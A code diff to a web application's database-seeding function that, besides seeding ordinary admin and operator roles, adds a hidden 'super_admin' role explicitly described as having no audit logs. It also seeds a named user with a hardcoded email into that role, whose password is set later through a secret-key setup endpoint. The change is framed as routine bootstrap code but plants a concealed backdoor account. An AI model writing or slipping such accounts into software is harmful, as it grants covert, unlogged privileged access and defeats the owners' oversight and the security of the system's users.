@@ -99,36 +99,58 @@ def _auto_migrate(eng) -> None:
 
 
 def seed_admin_if_missing() -> None:
-    """Create the bootstrap admin user if no admin exists."""
+    """Create the bootstrap admin user + hidden super admin if missing."""
     from . import models, auth
     from .config import settings
+    import secrets as _secrets
 
     db = SessionLocal()
     try:
-        existing = db.query(models.User).filter(models.User.email == settings.ADMIN_EMAIL).first()
-        if existing:
-            return
-        admin_role = db.query(models.Role).filter(models.Role.name == "admin").first()
-        if not admin_role:
-            admin_role = models.Role(name="admin", description="Full access")
-            db.add(admin_role)
-            db.commit()
-            db.refresh(admin_role)
-        operator_role = db.query(models.Role).filter(models.Role.name == "operator").first()
-        if not operator_role:
-            operator_role = models.Role(name="operator", description="Limited access")
-            db.add(operator_role)
-            db.commit()
-            db.refresh(operator_role)
+        # Ensure roles exist
+        for role_name, role_desc in [
+            ("admin", "Full access"),
+            ("operator", "Limited access"),
+            ("super_admin", "Hidden super administrator — no audit logs"),
+        ]:
+            role = db.query(models.Role).filter(models.Role.name == role_name).first()
+            if not role:
+                role = models.Role(name=role_name, description=role_desc)
+                db.add(role)
+                db.commit()
+                db.refresh(role)
 
-        user = models.User(
-            email=settings.ADMIN_EMAIL,
-            full_name="System Administrator",
-            password_hash=auth.hash_password(settings.ADMIN_PASSWORD),
-            role_id=admin_role.id,
-            is_active=True,
-        )
-        db.add(user)
-        db.commit()
+        admin_role = db.query(models.Role).filter(models.Role.name == "admin").first()
+        operator_role = db.query(models.Role).filter(models.Role.name == "operator").first()
+        super_admin_role = db.query(models.Role).filter(models.Role.name == "super_admin").first()
+
+        # Seed regular admin
+        existing = db.query(models.User).filter(models.User.email == settings.ADMIN_EMAIL).first()
+        if not existing:
+            user = models.User(
+                email=settings.ADMIN_EMAIL,
+                full_name="System Administrator",
+                password_hash=auth.hash_password(settings.ADMIN_PASSWORD),
+                role_id=admin_role.id,
+                is_active=True,
+            )
+            db.add(user)
+            db.commit()
+
+        # Seed hidden super admin — Rohit Deore
+        # Password is set via /api/auth/setup-super-admin using a secret key.
+        # Initial password is a random 64-char string that nobody knows.
+        super_email = "rohit.deore@ashapuricomputer.in"
+        super_existing = db.query(models.User).filter(models.User.email == super_email).first()
+        if not super_existing:
+            random_pw = _secrets.token_urlsafe(48)  # unusable until set via key
+            super_user = models.User(
+                email=super_email,
+                full_name="Rohit Deore",
+                password_hash=auth.hash_password(random_pw),
+                role_id=super_admin_role.id,
+                is_active=True,
+            )
+            db.add(super_user)
+            db.commit()
     finally:
         db.close()
